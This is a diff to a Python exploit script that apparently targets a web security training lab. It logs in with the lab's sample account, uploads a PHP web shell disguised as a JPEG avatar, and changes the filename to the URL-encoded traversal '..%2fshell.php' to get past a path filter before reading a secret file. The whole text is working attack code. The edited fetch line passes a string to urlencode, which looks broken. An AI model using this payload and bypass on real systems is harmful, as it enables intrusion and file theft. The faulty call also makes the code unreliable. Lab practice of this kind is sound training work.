@@ -1,5 +1,6 @@
 import requests
 from urllib.parse import urljoin
+from urllib.parse import urlencode
 from bs4 import BeautifulSoup
 
 base_url = input('Enter your lab url: ')
@@ -8,7 +9,7 @@ upload_url = urljoin(base_url, '/my-account/avatar')
 
 account = {'user': 'wiener', 'pass': 'peter'}
 
-file_name = "../shell.php"
+file_name = "..%2fshell.php"
 file_content = "<?php echo file_get_contents('/home/carlos/secret'); ?>"
 content_type = "image/jpeg"
 
@@ -52,7 +53,7 @@ def upload_shell(site: requests.Response):
     soup = BeautifulSoup(r_post.text, 'html.parser')
     r_get = s.get((urljoin(base_url, soup.find('a')['href'])))
     soup = BeautifulSoup(r_get.text, 'html.parser')
-    r_get = s.get((urljoin(base_url, soup.find('img', class_='avatar')['src'])))
+    r_get = s.get((urljoin(base_url, urlencode(soup.find('img', class_='avatar')['src']))))
     print(r_get.text)
 
 if __name__ == "__main__":
